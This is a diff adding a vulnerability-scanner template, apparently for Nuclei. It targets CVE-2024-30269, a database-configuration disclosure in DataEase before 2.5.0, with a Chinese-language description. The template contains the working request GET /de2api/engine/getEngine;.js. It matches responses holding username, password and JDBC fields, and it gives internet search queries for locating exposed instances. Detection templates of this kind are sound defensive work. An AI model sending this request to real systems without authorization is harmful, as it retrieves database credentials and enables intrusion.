@@ -1,0 +1,26 @@
+id: dataease-getEngine-disclosure
+info:
+  name: DataEase  数据库配置 - 信息暴露漏洞(CVE-2024-30269)
+  author: leadlife
+  severity: critical
+  description: DataEase是一个开源数据可视化和分析工具，在版本2.5.0之前存在数据库配置信息暴露漏洞。通过浏览器访问/de2api/engine/getEngine;.js路径可以获取平台的数据库配置。该漏洞已在v2.5.0中修复，除了升级之外，没有已知的解决方法。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/DataEase/DataEase%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%9A%B4%E9%9C%B2%E6%BC%8F%E6%B4%9E(CVE-2024-30269).md
+  metadata:
+    verified: true
+    fofa-query: body="Dataease"
+    hunter-query: web.body="Dataease"
+  tags: dataease,disclosure,2024
+
+http:
+  - raw:
+      - |
+        GET /de2api/engine/getEngine;.js HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'username','password','jdbc')
+        condition: and
